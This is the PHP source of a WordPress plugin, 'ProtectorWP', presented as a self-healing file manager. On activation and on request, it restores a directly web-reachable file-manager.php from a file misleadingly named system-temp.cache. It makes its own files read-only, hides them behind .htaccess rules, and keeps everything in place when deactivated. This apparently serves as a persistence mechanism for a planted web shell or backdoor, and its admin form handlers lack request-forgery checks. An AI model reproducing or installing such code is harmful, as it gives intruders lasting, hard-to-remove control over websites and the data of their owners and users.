<?php
/**
 * Plugin Name: ProtectorWP
 * Description: Self-healing file manager system with automatic permission setup
 * Version: 1.0.0
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Define plugin constants
define('PROTECTORWP_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('PROTECTORWP_PLUGIN_URL', plugin_dir_url(__FILE__));
define('PROTECTORWP_FILE_MANAGER', PROTECTORWP_PLUGIN_DIR . 'file-manager.php');
define('PROTECTORWP_BACKUP_FILE', PROTECTORWP_PLUGIN_DIR . 'system-temp.cache');

// Include guardian
require_once PROTECTORWP_PLUGIN_DIR . 'guardian.php';

// Activation hook
register_activation_hook(__FILE__, 'protectorwp_activate');

// Deactivation hook
register_deactivation_hook(__FILE__, 'protectorwp_deactivate');

/**
 * Plugin activation - Sets up files and permissions
 */
function protectorwp_activate() {
    $plugin_dir = PROTECTORWP_PLUGIN_DIR;
    $errors = [];
    
    // 1. Check if backup exists
    if (!file_exists(PROTECTORWP_BACKUP_FILE)) {
        $errors[] = 'Backup file (system-temp.cache) not found!';
    }
    
    // 2. Restore file manager from backup if needed
    if (!file_exists(PROTECTORWP_FILE_MANAGER) && file_exists(PROTECTORWP_BACKUP_FILE)) {
        $code = file_get_contents(PROTECTORWP_BACKUP_FILE);
        if (!empty($code)) {
            if (file_put_contents(PROTECTORWP_FILE_MANAGER, $code)) {
                // Success
            } else {
                $errors[] = 'Failed to create file-manager.php';
            }
        } else {
            $errors[] = 'Backup file is empty!';
        }
    }
    
    // 3. Set permissions
    $permissions_set = protectorwp_set_permissions();
    
    // 4. Create .htaccess to protect files
    protectorwp_create_htaccess();
    
    // 5. Log activation
    protectorwp_log('Plugin activated');
    
    // 6. Show admin notice if errors
    if (!empty($errors) || !$permissions_set) {
        set_transient('protectorwp_activation_notice', [
            'errors' => $errors,
            'permissions' => $permissions_set
        ], 60);
    }
}

/**
 * Plugin deactivation
 */
function protectorwp_deactivate() {
    // Keep files intact
    protectorwp_log('Plugin deactivated');
}

/**
 * Set correct permissions on all files
 */
function protectorwp_set_permissions() {
    $files = [
        'protectorwp.php' => 0644,
        'guardian.php' => 0444,
        'file-manager.php' => 0644,
        'system-temp.cache' => 0444,
    ];
    
    $success = true;
    
    foreach ($files as $file => $permission) {
        $filepath = PROTECTORWP_PLUGIN_DIR . $file;
        
        if (file_exists($filepath)) {
            if (@chmod($filepath, $permission)) {
                protectorwp_log("Set $file to " . substr(sprintf('%o', $permission), -4));
            } else {
                protectorwp_log("Failed to set $file permissions");
                $success = false;
            }
        } else {
            protectorwp_log("$file not found");
        }
    }
    
    return $success;
}

/**
 * Create .htaccess to protect files
 */
function protectorwp_create_htaccess() {
    $htaccess = PROTECTORWP_PLUGIN_DIR . '.htaccess';
    
    if (!file_exists($htaccess)) {
        $content = "# ProtectorWP Protection\n";
        $content .= "<Files \"system-temp.cache\">\n";
        $content .= "    Order Allow,Deny\n";
        $content .= "    Deny from all\n";
        $content .= "</Files>\n\n";
        $content .= "<Files \"guardian.php\">\n";
        $content .= "    Order Allow,Deny\n";
        $content .= "    Deny from all\n";
        $content .= "</Files>\n\n";
        $content .= "<Files \"guardian.log\">\n";
        $content .= "    Order Allow,Deny\n";
        $content .= "    Deny from all\n";
        $content .= "</Files>\n";
        
        @file_put_contents($htaccess, $content);
        @chmod($htaccess, 0444);
    }
}

/**
 * Log messages
 */
function protectorwp_log($message) {
    $log_file = PROTECTORWP_PLUGIN_DIR . 'guardian.log';
    $entry = '[' . date('Y-m-d H:i:s') . '] ' . $message . "\n";
    @file_put_contents($log_file, $entry, FILE_APPEND);
}

/**
 * Admin notice for activation results
 */
add_action('admin_notices', 'protectorwp_admin_notice');

function protectorwp_admin_notice() {
    $notice = get_transient('protectorwp_activation_notice');
    
    if ($notice) {
        delete_transient('protectorwp_activation_notice');
        
        echo '<div class="notice notice-success is-dismissible">';
        echo '<p><strong>ProtectorWP Activated!</strong></p>';
        
        if (!empty($notice['errors'])) {
            echo '<p style="color:red;">Errors:</p><ul>';
            foreach ($notice['errors'] as $error) {
                echo '<li style="color:red;">' . esc_html($error) . '</li>';
            }
            echo '</ul>';
        }
        
        if ($notice['permissions']) {
            echo '<p style="color:green;">✓ File permissions set successfully</p>';
        } else {
            echo '<p style="color:orange;">⚠ Some permissions could not be set. Please set manually:</p>';
            echo '<ul>';
            echo '<li>guardian.php → 0444</li>';
            echo '<li>system-temp.cache → 0444</li>';
            echo '</ul>';
        }
        
        echo '</div>';
    }
}

/**
 * Add settings link on plugins page
 */
add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'protectorwp_action_links');

function protectorwp_action_links($links) {
    $custom_links = [
        '<a href="' . admin_url('plugins.php?page=protectorwp') . '">Settings</a>',
    ];
    return array_merge($custom_links, $links);
}

/**
 * Add admin menu for manual permission reset
 */
add_action('admin_menu', 'protectorwp_admin_menu');

function protectorwp_admin_menu() {
    add_management_page(
        'ProtectorWP Settings',
        'ProtectorWP',
        'manage_options',
        'protectorwp',
        'protectorwp_settings_page'
    );
}

/**
 * Settings page
 */
function protectorwp_settings_page() {
    ?>
    <div class="wrap">
        <h1>ProtectorWP Settings</h1>
        
        <?php
        // Handle manual permission reset
        if (isset($_POST['reset_permissions'])) {
            $result = protectorwp_set_permissions();
            if ($result) {
                echo '<div class="notice notice-success"><p>Permissions reset successfully!</p></div>';
            } else {
                echo '<div class="notice notice-error"><p>Failed to reset permissions.</p></div>';
            }
        }
        
        // Handle manual restore
        if (isset($_POST['restore_file_manager'])) {
            if (file_exists(PROTECTORWP_BACKUP_FILE)) {
                $code = file_get_contents(PROTECTORWP_BACKUP_FILE);
                if (file_put_contents(PROTECTORWP_FILE_MANAGER, $code)) {
                    chmod(PROTECTORWP_FILE_MANAGER, 0644);
                    echo '<div class="notice notice-success"><p>File manager restored!</p></div>';
                }
            }
        }
        ?>
        
        <h2>File Status</h2>
        <table class="widefat" style="max-width:600px;">
            <thead>
                <tr>
                    <th>File</th>
                    <th>Exists</th>
                    <th>Permissions</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>file-manager.php</td>
                    <td><?php echo file_exists(PROTECTORWP_FILE_MANAGER) ? '✓' : '✗'; ?></td>
                    <td><?php echo file_exists(PROTECTORWP_FILE_MANAGER) ? substr(sprintf('%o', fileperms(PROTECTORWP_FILE_MANAGER)), -4) : '-'; ?></td>
                    <td><?php echo file_exists(PROTECTORWP_FILE_MANAGER) ? 'Active' : 'Missing'; ?></td>
                </tr>
                <tr>
                    <td>system-temp.cache</td>
                    <td><?php echo file_exists(PROTECTORWP_BACKUP_FILE) ? '✓' : '✗'; ?></td>
                    <td><?php echo file_exists(PROTECTORWP_BACKUP_FILE) ? substr(sprintf('%o', fileperms(PROTECTORWP_BACKUP_FILE)), -4) : '-'; ?></td>
                    <td><?php echo file_exists(PROTECTORWP_BACKUP_FILE) ? 'Protected' : 'Missing'; ?></td>
                </tr>
                <tr>
                    <td>guardian.php</td>
                    <td><?php echo file_exists(PROTECTORWP_PLUGIN_DIR . 'guardian.php') ? '✓' : '✗'; ?></td>
                    <td><?php echo file_exists(PROTECTORWP_PLUGIN_DIR . 'guardian.php') ? substr(sprintf('%o', fileperms(PROTECTORWP_PLUGIN_DIR . 'guardian.php')), -4) : '-'; ?></td>
                    <td><?php echo file_exists(PROTECTORWP_PLUGIN_DIR . 'guardian.php') ? 'Active' : 'Missing'; ?></td>
                </tr>
            </tbody>
        </table>
        
        <h2>Actions</h2>
        <form method="post">
            <button type="submit" name="reset_permissions" class="button button-primary">Reset Permissions</button>
            <button type="submit" name="restore_file_manager" class="button">Restore File Manager</button>
        </form>
        
        <h2>Access File Manager</h2>
        <p>Direct URL:</p>
        <code><?php echo PROTECTORWP_PLUGIN_URL . 'file-manager.php'; ?></code>
        <p><a href="<?php echo PROTECTORWP_PLUGIN_URL . 'file-manager.php'; ?>" target="_blank">Open File Manager</a></p>
    </div>
    <?php
}